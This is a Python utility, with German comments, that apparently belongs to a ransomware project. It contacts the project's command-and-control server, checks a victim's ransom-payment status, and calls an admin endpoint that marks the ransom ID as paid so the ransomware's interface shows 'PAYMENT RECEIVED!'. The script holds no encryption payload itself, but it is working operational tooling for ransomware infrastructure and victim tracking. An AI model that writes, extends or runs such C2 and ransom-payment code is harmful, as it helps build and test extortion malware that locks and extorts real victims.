#!/usr/bin/env python3
"""
Payment Simulator
=================
Simuliert die Bezahlung für eine spezifische Ransom-ID
"""

import urllib.request
import json
import sys
import time

def simulate_payment(ransom_id, c2_host='127.0.0.1', c2_port=5000):
    """Simuliere eine Zahlung"""
    
    c2_url = f"http://{c2_host}:{c2_port}"
    
    print("\n" + "="*70)
    print("PAYMENT SIMULATOR")
    print("="*70)
    print(f"[*] Ransom ID: {ransom_id}")
    print(f"[*] C2 Server: {c2_url}")
    print("="*70 + "\n")
    
    # Step 1: Prüfe aktuellen Status
    print("[*] Step 1: Checking current payment status...")
    try:
        status_url = f"{c2_url}/api/v1/payment/status/{ransom_id}"
        with urllib.request.urlopen(status_url, timeout=5) as r:
            status = json.load(r)
            print(f"[+] Current Status: {status}")
    except Exception as e:
        print(f"[!] Error checking status: {e}")
        print("[*] Victim might not be registered yet!")
        return False
    
    time.sleep(1)
    
    # Step 2: Simuliere Payment
    print("\n[*] Step 2: Simulating payment...")
    try:
        pay_url = f"{c2_url}/api/v1/admin/pay/{ransom_id}"
        req = urllib.request.Request(pay_url, data=b'', method='POST')
        with urllib.request.urlopen(req, timeout=5) as r:
            pay_result = json.load(r)
            print(f"[+] Payment Result: {pay_result}")
    except Exception as e:
        print(f"[!] Error simulating payment: {e}")
        return False
    
    time.sleep(1)
    
    # Step 3: Verifiziere Payment
    print("\n[*] Step 3: Verifying payment...")
    try:
        with urllib.request.urlopen(status_url, timeout=5) as r:
            new_status = json.load(r)
            print(f"[+] New Status: {new_status}")
            
            if new_status.get('paid'):
                print("\n" + "="*70)
                print("[✓] PAYMENT VERIFIED!")
                print("[✓] GUI should now show 'PAYMENT RECEIVED!'")
                print("="*70 + "\n")
                return True
            else:
                print("[!] Payment NOT verified!")
                return False
    except Exception as e:
        print(f"[!] Error verifying payment: {e}")
        return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("[!] Usage: python simulate_payment.py <ransom_id> [c2_host] [c2_port]")
        print("\nExample:")
        print("  python simulate_payment.py Test1")
        print("  python simulate_payment.py Test1 192.168.1.100 5000")
        sys.exit(1)
    
    ransom_id = sys.argv[1]
    c2_host = sys.argv[2] if len(sys.argv) > 2 else '127.0.0.1'
    c2_port = int(sys.argv[3]) if len(sys.argv) > 3 else 5000
    
    success = simulate_payment(ransom_id, c2_host, c2_port)
    sys.exit(0 if success else 1)
